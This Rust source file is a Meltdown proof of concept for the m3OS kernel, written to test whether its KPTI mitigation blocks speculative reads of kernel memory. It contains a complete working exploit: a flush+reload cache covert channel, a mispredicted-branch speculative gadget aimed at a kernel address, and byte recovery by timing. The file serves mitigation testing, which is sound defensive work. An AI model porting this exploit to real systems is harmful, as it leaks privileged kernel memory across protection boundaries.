//! Meltdown PoC (Phase 110 Track A.6) — proves KPTI actually defends against a
//! cross-privilege speculative read on Meltdown-susceptible silicon.
//!
//! This is a ported public Meltdown primitive: a **flush+reload** cache covert
//! channel plus a speculative read of a **kernel** virtual address. On a
//! Meltdown-susceptible CPU the supervisor-bit permission check on the read is
//! deferred past speculation, so the byte is transiently forwarded and encoded
//! into the cache side channel; the reload then recovers it by timing.
//!
//! - **KPTI off** (`M3OS_MITIGATIONS=off`): the kernel is mapped in the user
//!   page tables (the vulnerability), so the speculative read forwards real
//!   kernel bytes → the channel recovers a *stable* byte string → `MELTDOWN_POC:
//!   LEAK`. This proves the PoC works and the silicon is susceptible.
//! - **KPTI on** (default image): the kernel VA is not present in the user CR3,
//!   so there is nothing to speculate against → noise floor → `MELTDOWN_POC:
//!   NO-LEAK`. This is the defense working.
//!
//! ## Why a mispredicted branch and not a fault handler
//!
//! The canonical Meltdown PoC suppresses the `#PF` from the illegal read with a
//! `SIGSEGV`/TSX handler. m3OS exposes **no catchable `SIGSEGV`** and Tiger Lake
//! ships with TSX disabled, so instead we hide the illegal read behind a
//! **mispredicted conditional branch**: the read only ever executes
//! *speculatively* (the branch resolves not-taken and squashes it), so it never
//! architecturally retires and never raises `#PF`. Consequence: the exact same
//! binary runs safely under both KPTI postures — under KPTI-on the speculative
//! read simply finds nothing mapped and forwards nothing, and never faults.
//!
//! ## This is a bench scaffold — it cannot be validated under QEMU
//!
//! QEMU TCG models neither speculation nor caches, so flush+reload timing is
//! meaningless there (every access costs ~the same). The positive **control**
//! arm (recover a known *user* byte through the same channel) is the on-CPU
//! self-check: if the control cannot even recover its own known byte, the
//! `CACHE_HIT_THRESHOLD` / iteration counts below need tuning *before* trusting
//! the kernel arm. Expect to tune `TRIES`, `TRAIN_ROUNDS`, `CACHE_HIT_THRESHOLD`
//! and `CONFIDENCE` at the bench for the specific Tiger Lake part.
//!
//! Bench arm: Block 2a of the 2026-07-09 Dell validation runbook; `next-dell-
//! session.md` Phase 110 "A.6 — Meltdown PoC reject".
#![no_std]
#![no_main]

use core::arch::asm;

use syscall_lib::{STDOUT_FILENO, write_str, write_u64};

syscall_lib::entry_point!(main);

// ===========================================================================
// Tunables — expect to adjust these at the bench for the target CPU.
// ===========================================================================

/// Bytes per channel slot. A full page defeats the adjacent-line/stride
/// prefetcher, so a hot slot means "the transient encoded exactly this byte".
const STRIDE: usize = 4096;
/// One slot per possible byte value.
const SLOTS: usize = 256;
/// Attempts per recovered byte; the winner is the most-frequently-hot slot.
const TRIES: u32 = 400;
/// Branch-predictor training iterations before each speculative attack, biasing
/// the conditional strongly "taken" so the attack call mispredicts into the
/// speculative body.
const TRAIN_ROUNDS: usize = 12;
/// Reload timing below this many cycles counts as an L1/L2 cache hit. Highly
/// CPU-dependent — the control arm calibrates whether this is right.
const CACHE_HIT_THRESHOLD: u64 = 130;
/// A recovered byte with at least this many hot hits (out of `TRIES`) is
/// treated as a real leak rather than channel noise.
const CONFIDENCE: u32 = TRIES / 8;
/// How many consecutive kernel bytes to leak (a short run makes a stable,
/// human-legible string under KPTI-off vs pure noise under KPTI-on).
const LEAK_LEN: usize = 16;

/// Kernel VA to leak from: the base of the kernel PIE image (loaded at the 1 TiB
/// mark — see the Phase 111 kgdb arm, "`nm` vaddr + `0x10000000000`"). Any
/// mapped kernel address works; point this at a known symbol's `nm` offset
/// + `0x10000000000` if a byte-exact expected value is wanted.
const KERNEL_TARGET_VA: usize = 0x10000000000;

/// Known-value user byte the control arm recovers through the same channel.
const CTRL_SECRET: u8 = 0x5a;

// ===========================================================================
// The cache covert channel — one page-aligned slot per byte value.
// ===========================================================================

#[repr(C, align(4096))]
struct Channel([u8; SLOTS * STRIDE]);

static mut CHANNEL: Channel = Channel([0u8; SLOTS * STRIDE]);

/// The value the branch compares against. `1` so training index `0` is "taken";
/// flushed before each attack so the compare stalls and widens the speculation
/// window. Never changes value — only its cache residency matters.
static mut GATE_LIMIT: usize = 1;

/// Benign user byte the training rounds read (so training retires cleanly and
/// the same load microarchitecture is exercised). Value `0` → training warms
/// slot 0, which the reader already ignores.
static DUMMY: u8 = 0;

#[inline(always)]
fn channel_base() -> *const u8 {
    (&raw const CHANNEL).cast::<u8>()
}

#[inline(always)]
fn channel_slot(byte: usize) -> *const u8 {
    // SAFETY: `byte` is a u8 value (0..=255), so `byte * STRIDE` stays inside
    // the SLOTS*STRIDE channel.
    unsafe { channel_base().add(byte * STRIDE) }
}

// ===========================================================================
// x86 microarchitectural primitives.
// ===========================================================================

/// Serialize, then read the timestamp counter. The leading `lfence` orders the
/// read after prior loads, the trailing one before the following measured
/// access. `rdtsc` (not `rdtscp`) is used deliberately: it is universally
/// available in ring 3 on every x86-64 and every QEMU CPU model, whereas a
/// `rdtscp` here faulted into a retry loop under the default TCG CPU; the
/// `lfence` pair supplies the ordering `rdtscp` would give for free.
#[inline(always)]
fn rdtsc_serialized() -> u64 {
    let lo: u32;
    let hi: u32;
    // SAFETY: lfence + rdtsc have no memory effects beyond ordering.
    unsafe {
        asm!(
            "lfence",
            "rdtsc",
            "lfence",
            out("eax") lo,
            out("edx") hi,
            options(nostack, nomem),
        );
    }
    (u64::from(hi) << 32) | u64::from(lo)
}

/// Evict one cache line containing `p`.
#[inline(always)]
fn clflush(p: *const u8) {
    // SAFETY: clflush of a mapped address is side-effect-free beyond eviction.
    unsafe {
        asm!("clflush [{p}]", p = in(reg) p, options(nostack, preserves_flags));
    }
}

/// Flush every channel slot so a subsequent reload measures only what the
/// transient encoded.
fn flush_channel() {
    for i in 0..SLOTS {
        clflush(channel_slot(i));
    }
    // SAFETY: ordering fence only.
    unsafe {
        asm!("mfence", options(nostack, nomem, preserves_flags));
    }
}

/// Pre-fault every channel page so later flush+reload measures cache state, not
/// demand-zero page faults.
fn pretouch_channel() {
    for i in 0..SLOTS {
        // SAFETY: in-bounds slot write to our own BSS.
        unsafe {
            core::ptr::write_volatile(channel_base().add(i * STRIDE) as *mut u8, 1);
        }
    }
}

/// Time a single load of `p` in cycles.
#[inline(always)]
fn timed_load(p: *const u8) -> u64 {
    let start = rdtsc_serialized();
    // SAFETY: `p` is a mapped channel slot.
    unsafe {
        core::ptr::read_volatile(p);
    }
    let end = rdtsc_serialized();
    end.wrapping_sub(start)
}

// ===========================================================================
// The speculative gadget.
// ===========================================================================

/// If `idx < GATE_LIMIT`, transiently read `*ptr` and encode the byte into the
/// channel. `#[inline(never)]` keeps this a single stable branch the predictor
/// can be trained on.
///
/// Training calls pass `idx = 0` (< 1 → taken) with a benign `ptr`, biasing the
/// branch "taken". The attack call passes `idx = GATE_LIMIT` (not taken
/// architecturally) with the kernel `ptr`, so the body runs only speculatively —
/// the illegal read never retires and never faults.
///
/// # Safety
///
/// `ptr` is read only inside the speculative window; it may be an unreadable
/// (kernel / unmapped) address by design. The read never architecturally
/// retires, so this cannot fault, but callers must keep the branch mispredicted
/// (train "taken", then call with `idx >= GATE_LIMIT`).
#[inline(never)]
unsafe fn spec_gadget(idx: usize, ptr: *const u8) {
    // SAFETY: volatile read of our own gate; keeps the compare (and branch).
    let limit = unsafe { core::ptr::read_volatile(&raw const GATE_LIMIT) };
    if idx < limit {
        // SAFETY: only reached architecturally in training (benign `ptr`); in
        // the attack it runs purely speculatively and is squashed.
        let val = unsafe { core::ptr::read_volatile(ptr) } as usize;
        // Encode the byte: touch its channel slot so the reload sees it hot.
        // SAFETY: `val` is a byte → in-bounds slot.
        unsafe {
            core::ptr::read_volatile(channel_base().add(val * STRIDE));
        }
    }
}

/// Reload the channel and return the fastest slot if it is a cache hit. Iterates
/// in a scrambled order so the hardware prefetcher cannot manufacture hits.
fn reload_hot_slot() -> Option<usize> {
    let mut best_slot = 0usize;
    let mut best_time = u64::MAX;
    let mut i = 0usize;
    while i < SLOTS {
        // Scrambled traversal (coprime stride) to dodge the stride prefetcher.
        let slot = i.wrapping_mul(167).wrapping_add(13) % SLOTS;
        let t = timed_load(channel_slot(slot));
        if t < best_time {
            best_time = t;
            best_slot = slot;
        }
        i += 1;
    }
    if best_time <= CACHE_HIT_THRESHOLD {
        Some(best_slot)
    } else {
        None
    }
}

/// Recover one byte from `target_ptr` over `tries` attempts. Returns the
/// most-frequently-hot non-zero slot and its hit count. Slot 0 is skipped
/// because the training rounds warm it and a fizzled transient defaults there.
fn recover_byte(target_ptr: *const u8, tries: u32) -> (u8, u32) {
    let mut hist = [0u32; SLOTS];
    for _ in 0..tries {
        flush_channel();
        // Train the branch strongly "taken" with a benign, readable pointer.
        for _ in 0..TRAIN_ROUNDS {
            // SAFETY: idx 0 < GATE_LIMIT → taken with a valid user pointer.
            unsafe {
                spec_gadget(0, &raw const DUMMY);
            }
        }
        // Stall the branch resolution so the mispredicted body has a wide
        // speculation window.
        clflush(&raw const GATE_LIMIT as *const u8);
        // SAFETY: idx == GATE_LIMIT → not taken architecturally; the kernel read
        // executes only in the (squashed) speculative shadow.
        let limit = unsafe { core::ptr::read_volatile(&raw const GATE_LIMIT) };
        unsafe {
            spec_gadget(limit, target_ptr);
        }
        if let Some(slot) = reload_hot_slot() {
            hist[slot] += 1;
        }
    }
    // Pick the winning non-zero slot.
    let mut best = 0usize;
    let mut best_hits = 0u32;
    for (slot, &hits) in hist.iter().enumerate().skip(1) {
        if hits > best_hits {
            best_hits = hits;
            best = slot;
        }
    }
    (best as u8, best_hits)
}

// ===========================================================================
// Output helpers (write_u64 is decimal-only; addresses/bytes want hex).
// ===========================================================================

fn write_hex(val: u64, nibbles: usize) {
    let mut buf = [0u8; 16];
    for (i, b) in buf.iter_mut().enumerate().take(nibbles) {
        let shift = (nibbles - 1 - i) * 4;
        let d = ((val >> shift) & 0xf) as u8;
        *b = if d < 10 { b'0' + d } else { b'a' + (d - 10) };
    }
    let _ = syscall_lib::write(STDOUT_FILENO, &buf[..nibbles]);
}

// ===========================================================================
// Arms.
// ===========================================================================

/// Positive control: encode a *known user byte* through the channel with a
/// direct (architectural) read — no speculation — and confirm the reload
/// recovers it. This calibrates the timing threshold on the real CPU.
fn run_control(tries: u32, confidence: u32) {
    let secret_holder: u8 = CTRL_SECRET;
    let mut hits = 0u32;
    for _ in 0..tries {
        flush_channel();
        // Direct architectural encode of the known byte.
        // SAFETY: reads our own local; slot is in-bounds.
        unsafe {
            let v = core::ptr::read_volatile(&raw const secret_holder) as usize;
            core::ptr::read_volatile(channel_base().add(v * STRIDE));
        }
        if reload_hot_slot() == Some(CTRL_SECRET as usize) {
            hits += 1;
        }
    }
    write_str(STDOUT_FILENO, "MELTDOWN_POC:ctrl expected=0x");
    write_hex(u64::from(CTRL_SECRET), 2);
    write_str(STDOUT_FILENO, " hits=");
    write_u64(STDOUT_FILENO, u64::from(hits));
    write_str(STDOUT_FILENO, "/");
    write_u64(STDOUT_FILENO, u64::from(tries));
    if hits >= confidence {
        write_str(STDOUT_FILENO, " channel=CALIBRATED\n");
    } else {
        write_str(
            STDOUT_FILENO,
            " channel=UNCALIBRATED (tune CACHE_HIT_THRESHOLD/TRIES before trusting the leak arm)\n",
        );
    }
}

/// Meltdown arm: attempt to leak `leak_len` bytes from the kernel image. In
/// `smoke` mode the leak/no-leak verdict is suppressed — with a tiny iteration
/// count and no cache model under QEMU TCG the result is pure noise, and a
/// "kernel memory recovered" line in CI output would be misleading.
fn run_leak(tries: u32, leak_len: usize, confidence: u32, smoke: bool) {
    write_str(STDOUT_FILENO, "MELTDOWN_POC:target addr=0x");
    write_hex(KERNEL_TARGET_VA as u64, 12);
    write_str(STDOUT_FILENO, " len=");
    write_u64(STDOUT_FILENO, leak_len as u64);
    write_str(STDOUT_FILENO, "\n");

    let mut recovered = 0u32;
    let mut bytes = [0u8; LEAK_LEN];
    for off in 0..leak_len {
        let addr = KERNEL_TARGET_VA + off;
        let (byte, hits) = recover_byte(addr as *const u8, tries);
        let confident = hits >= confidence;
        if confident {
            recovered += 1;
        }
        bytes[off] = byte;
        write_str(STDOUT_FILENO, "MELTDOWN_POC:leak off=");
        write_u64(STDOUT_FILENO, off as u64);
        write_str(STDOUT_FILENO, " byte=0x");
        write_hex(u64::from(byte), 2);
        write_str(STDOUT_FILENO, " hits=");
        write_u64(STDOUT_FILENO, u64::from(hits));
        write_str(STDOUT_FILENO, "/");
        write_u64(STDOUT_FILENO, u64::from(tries));
        write_str(
            STDOUT_FILENO,
            if confident {
                " [confident]\n"
            } else {
                " [noise]\n"
            },
        );
    }

    // A stuck-hot channel slot — the dominant failure mode of an untuned
    // CACHE_HIT_THRESHOLD on real silicon — recovers the SAME byte at every
    // offset with high "confidence". Real kernel-image memory (.text at the PIE
    // base) is varied, so a uniform recovery is a cache artifact, NOT a leak.
    // Require the recovered run to be non-uniform before declaring a leak — this
    // is what keeps the PoC from crying wolf on a Meltdown-immune (`rdcl_no`)
    // CPU where the read is hardware-blocked yet the channel still has a
    // consistently-warm slot (the Dell/Tiger Lake `0xdb`×16 false positive).
    let uniform = leak_len > 1 && bytes[..leak_len].iter().all(|&b| b == bytes[0]);

    if smoke {
        write_str(
            STDOUT_FILENO,
            "MELTDOWN_POC:smoke (verdict suppressed — no cache model under TCG)\n",
        );
    } else if recovered >= 1 && !uniform {
        write_str(STDOUT_FILENO, "MELTDOWN_POC:LEAK bytes=");
        write_u64(STDOUT_FILENO, u64::from(recovered));
        write_str(STDOUT_FILENO, "/");
        write_u64(STDOUT_FILENO, leak_len as u64);
        write_str(
            STDOUT_FILENO,
            " (varied kernel memory recovered — KPTI OFF / susceptible silicon)\n",
        );
    } else if uniform {
        // High-confidence but uniform → the artifact path.
        write_str(
            STDOUT_FILENO,
            "MELTDOWN_POC:NO-LEAK (uniform recovery = stuck-slot cache artifact, not memory; \
             CPU not susceptible / rdcl_no, or tune CACHE_HIT_THRESHOLD)\n",
        );
    } else {
        write_str(
            STDOUT_FILENO,
            "MELTDOWN_POC:NO-LEAK (noise floor — KPTI ON, or CPU not susceptible)\n",
        );
    }
}

fn main(args: &[&str]) -> i32 {
    // `--smoke` runs a tiny number of iterations so the CI run-to-completion
    // gate finishes fast under QEMU TCG (where every `rdtscp`/`clflush`/fence is
    // a slow emulated helper). It exercises every code path — channel, control,
    // and speculative gadget — without waiting for statistically-meaningful
    // sample counts (the leak result is noise under TCG regardless). The bench
    // run uses no flag and the full HW-appropriate `TRIES`/`LEAK_LEN`.
    let smoke = args.contains(&"--smoke");
    let tries = if smoke { 4 } else { TRIES };
    let leak_len = if smoke { 2 } else { LEAK_LEN };
    let confidence = if smoke { 1 } else { CONFIDENCE };

    write_str(STDOUT_FILENO, "MELTDOWN_POC:start\n");
    pretouch_channel();
    write_str(STDOUT_FILENO, "MELTDOWN_POC:channel-ready\n");
    run_control(tries, confidence);
    run_leak(tries, leak_len, confidence, smoke);
    write_str(STDOUT_FILENO, "MELTDOWN_POC:done\n");
    0
}

#[panic_handler]
fn panic(_: &core::panic::PanicInfo) -> ! {
    write_str(STDOUT_FILENO, "meltdown-poc: PANIC\n");
    syscall_lib::exit(101)
}
